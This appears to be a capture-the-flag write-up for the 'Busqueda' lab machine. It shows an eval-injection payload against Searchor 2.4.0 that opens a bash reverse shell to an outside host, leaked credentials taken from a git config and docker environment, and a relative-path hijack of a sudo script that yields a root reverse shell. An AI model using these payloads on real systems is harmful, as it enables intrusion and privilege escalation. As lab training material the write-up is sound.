### Summary
We start the box with a web server running a vulnerable version of the python library `searchor`. We exploit the command injection to get a reverse shell as the user `svc`. We find a `.git` directory in our landing location with a dubious `git status` message, prompting us to check the config file which contains credentials for a `gitea` instance. Using those credentials, we discover we can run a python script as `sudo`. We run said script to gather `docker` config info on the `gitea` instance which leaks the administrator password, granting us access to the `scripts` repository and their source code. We discover a path hijacking vulnerability in the script, allowing us quick privilege escalation

### Tools
- `ffuf`
- `burp`

###### [[#Recon]]
- [[#Initial Scan]]
	- [[#Subdomain Brute-Force]]
- [[#HTTP - TCP 80]]
###### [[#User Shell - svc]]
- [[#Python Command Injection]]
- [[#Enumeration as svc]]
- [[#system-checkup.py]]
- [[#Gitea Instance]]
	- [[#system-checkup.py source]]
	- [[#full-checkup.sh]]
###### [[#Root Shell]]
- [[#Path Hijacking Vulnerability]]

---

# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv $IP -oN nmap/tcp  
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

❯ sudo nmap -p 22,80 -sCV -vv $IP -oN nmap/tcpScripts          
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
|   256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- We've got a POSIX adherent TTL
- Given OpenSSH and Apache versions we're likely working with Ubuntu `22.04`
- We're working with subdomains or virtual hosts, we'll use `ffuf` to brute-force

### Subdomain Brute-Force
```sh
❯ ffuf -u http://10.129.228.217 -H "Host: FUZZ.searcher.htb" -w ~/ctf/TOOLS/wordlist/Discovery/DNS/subdomains-top1million-20000.txt -ac
```
- We don't get anything

- We can add `searcher.htb` to our `/etc/hosts` file and re-run `nmap -sCV`
```sh
❯ sudo nmap -p 80 -sCV searcher.htb
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Searcher
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
```
- Nothing especially interesting other than `Werkzeug` which we could've figured our with `wappalyzer`

## HTTP - TCP 80
---
- We open the webpage to see Searcher, a search engine wrapper powered by `Flash` and `Searchor 2.4.0`
- We can select a search engine and query, optionally allowing redirects 
- There's a redirect to `Searchor`'s github repo where we see a single [security advisory](https://github.com/ArjunSharda/Searchor/security/advisories/GHSA-66m2-493m-crh2) labeled **Arbitrary Code using Eval in Searchor CLI's Search** for versions `<= 2.4.1`
	- We can jump to version `2.4.2` to see a link to the [patch](https://github.com/ArjunSharda/Searchor/pull/130/changes) in the readme

![[Pasted image 20260226015208.png]]
- The vulnerable line of code is
```python
url = eval(
            f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
        )
```
- Looks like we can inject single quotes into the query parameter to get python eval RCE

# User Shell - svc
## Python Command Injection
---
- We'll wanna open this up in `burp` for ease of http exploitation
```http
POST /search HTTP/1.1
Host: searcher.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

engine=Accuweather&query=test

HTTP/1.1 200 OK
Date: Thu, 26 Feb 2026 06:56:17 GMT
Server: Werkzeug/2.1.2 Python/3.10.6
Content-Type: text/html; charset=utf-8
Content-Length: 58
Vary: Accept-Encoding

https://www.accuweather.com/en/search-locations?query=test
```

- We can send a test query as `'` and see what happens
```http
POST /search HTTP/1.1
Host: searcher.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

engine=Accuweather&query='

HTTP/1.1 200 OK
Date: Thu, 26 Feb 2026 06:57:18 GMT
Server: Werkzeug/2.1.2 Python/3.10.6
Content-Type: text/html; charset=utf-8
Content-Length: 0


```
- We get a blank reply, indicating strange behavior. This is likely vulnerable

- I played around with this a lot, it would also be helpful to install the vulnerable code locally to see error messages, but essentially we want to import the `os` module and execute commands that will then materialize as valid strings to be passed to the query
- The payload `' + __import__('os').popen('id').read() + '` will actualize as `Engine.{engine}.search('' + __import__('os').popen('id').read() + '', copy_url={copy}, open_web={open})`
```http
POST /search HTTP/1.1
Host: searcher.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

engine=Accuweather&query='+%2b+__import__('os').popen('id').read()+%2b+'

HTTP/1.1 200 OK
Date: Thu, 26 Feb 2026 07:09:55 GMT
Server: Werkzeug/2.1.2 Python/3.10.6
Content-Type: text/html; charset=utf-8
Content-Length: 123
Vary: Accept-Encoding

https://www.accuweather.com/en/search-locations?query=uid%3D1000%28svc%29%20gid%3D1000%28svc%29%20groups%3D1000%28svc%29%0A

https://www.accuweather.com/en/search-locations?query=uid=1000(svc) gid=1000(svc) groups=1000(svc)
```
- We've got RCE babeyy

- We can replace the `id` command with a bash reverse shell (`bash -c 'bash -i ...`)
```http
POST /search HTTP/1.1
Host: searcher.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 78

engine=Accuweather&query='+%2b+__import__('os').popen('bash%20-c%20%22bash%20-i%20%3e%26%20%2fdev%2ftcp%2f10.10.15.234%2f12345%200%3e%261%22').read()+%2b+'

engine=Accuweather&query='   __import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.15.234/12345 0>&1"').read()   '
```
```sh
❯ nc -lvnp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.228.217.
Ncat: Connection from 10.129.228.217:54076.
bash: cannot set terminal process group (1542): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ 
```

## Enumeration as svc
---
- We can grab the `user.txt` already
```sh
svc@busqueda:/var/www/app$ cat ~/user.txt 
95a445bb96788497c70543cfbe4e80d8
```

- There's a `.git` folder in the landing directory `/var/www/app`
- I try to get a status but I get the following error:
```sh
svc@busqueda:/var/www/app/.git$ git status
fatal: detected dubious ownership in repository at '/var/www/app/.git'
To add an exception for this directory, call:

        git config --global --add safe.directory /var/www/app/.git
```

- We can inspect the config file for more information
```sh
svc@busqueda:/var/www/app/.git$ cat config 
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```
- Looks like we've got credentials, `cody:jh1usoih2bkjaspwe92`
- We also see a subdomain, `gitea.searcher.htb`. We can add that to our `/etc/hosts` file and give it a peek

- We can attempt to perform `sudo -l` but we're prompted a password. We input `jh1usoih2bkjaspwe92` and it works! We can also switch over to `.ssh` from here
```sh
svc@busqueda:/var/www/app/.git$ sudo -l
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```
- We can run `/opt/scripts/system-checkup.py` as `sudo`

- There are two directories in `/opt`, `scripts` and `containderd`, the latter of which we don't have access to

## system-checkup.py
---
- The `system-checkup.py` scripts isn't readable by any user other than `root`
```sh
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py --help
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

```sh
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED       STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 years ago   Up 2 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 years ago   Up 2 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```
- We see two docker containers running, `gitea` and `mysql`

- The `docker-inspect` command requires a format specifier that doesn't give additional information. We can only assume it's [docker format](https://docs.docker.com/engine/cli/formatting/#hint) which has a handy payload for showing which data can be printed (`{{json .}}`)
```sh
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq .Config.Env
[
  "USER_UID=115",
  "USER_GID=121",
  "GITEA__database__DB_TYPE=mysql",
  "GITEA__database__HOST=db:3306",
  "GITEA__database__NAME=gitea",
  "GITEA__database__USER=gitea",
  "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
  "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
  "USER=git",
  "GITEA_CUSTOM=/data/gitea"
]
```
- Looks like we've got database creds, `gitea:yuiu1hoiu4i5ho1uh`

## Gitea Instance
---
- We can navigate to `http://gitea.searcher.htb/` and log in with `cody`'s credentials to find a single repository, `Searcher_site`
	- It's not especially interesting, only a single commit containing the web application and the single index template
- We can try the creds `administrator:yuiu1hoiu4i5ho1uh` from the docker config and we get access

- There's another repo we can see, `scripts`. It looks like the contents of `/opt/scripts`
### system-checkup.py source
```python
#!/bin/bash
import subprocess
import sys

actions = ['full-checkup', 'docker-ps','docker-inspect']

def run_command(arg_list):
    r = subprocess.run(arg_list, capture_output=True)
    if r.stderr:
        output = r.stderr.decode()
    else:
        output = r.stdout.decode()
	
    return output


def process_action(action):
    if action == 'docker-inspect':
        try:
            _format = sys.argv[2]
            if len(_format) == 0:
                print(f"Format can't be empty")
                exit(1)
            container = sys.argv[3]
            arg_list = ['docker', 'inspect', '--format', _format, container]
            print(run_command(arg_list)) 
        
        except IndexError:
            print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")
            exit(1)
	    
        except Exception as e:
            print('Something went wrong')
            exit(1)
    
    elif action == 'docker-ps':
        try:
            arg_list = ['docker', 'ps']
            print(run_command(arg_list)) 
        
        except:
            print('Something went wrong')
            exit(1)
	
    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
            

if __name__ == '__main__':
	
    try:
        action = sys.argv[1]
        if action in actions:
            process_action(action)
        else:
            raise IndexError
	
    except IndexError:
        print(f'Usage: {sys.argv[0]} <action> (arg1) (arg2)')
        print('')
        print('     docker-ps     : List running docker containers')
        print('     docker-inspect : Inpect a certain docker container')
        print('     full-checkup  : Run a full system checkup')
        print('')
        exit(1)
```
- Looks like the `full-checkup` command is grabbing arguments from the `full-checkup.sh` file

### full-checkup.sh
```sh
#!/bin/bash

/usr/bin/echo '[=] Docker conteainers'

/usr/bin/docker ps -s -q|/usr/bin/xargs -I {} /usr/bin/docker inspect --format='{ {{json .Name}} : {{json .State.Status}} }' {}|/usr/bin/jq
/usr/bin/echo ''

/usr/bin/echo '[=] Docker port mappings'

/usr/bin/docker inspect gitea --format='{{json .NetworkSettings.Ports}}'|/usr/bin/jq
/usr/bin/echo ''
#!/bin/bash

/usr/bin/echo '[=] Apache webhosts'
/usr/bin/wget http://searcher.htb/ -T 3 -O /dev/null -q
if [[ $? -eq "0" ]]; then
	/usr/bin/echo '[+] searcher.htb is up'
else
	/usr/bin/echo '[-] searcher.htb is down'
fi

/usr/bin/wget http://gitea.searcher.htb/ -T 3 -O /dev/null -q
if [[ $? -eq "0" ]]; then
        /usr/bin/echo '[+] gitea.searcher.htb is up'
else
        /usr/bin/echo '[-] gitea.searcher.htb is down'
fi
/usr/bin/echo ''

/usr/bin/echo '[=] PM2 processes'
/usr/local/bin/pm2 list
```

# Root Shell
## Path Hijacking Vulnerability
---
- `system-checkup.py` is calling `subprocess.run` on `./full-checkup.sh` meaning that we can run this file from anywhere and it will always check for `full-checkup.sh` in our `pwd`
- We can create a malicious bash script and test to see if we have `root` RCE
```sh
#!/bin/bash
id > /tmp/wallfly
```

```sh
svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
svc@busqueda:/tmp$ cat wallfly 
uid=0(root) gid=0(root) groups=0(root)
```
- We've got `root` RCE! Let's swap the script to a reverse shell and profit

```sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.15.234/12345 0>&1
```
```
sh
❯ nc -lvnp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.228.217.
Ncat: Connection from 10.129.228.217:54838.
root@busqueda:/tmp# cat /root/root.txt
cat /root/root.txt
ab4cb6aa9f949ac487f667d18797ebbd
root@busqueda:/tmp# 
```

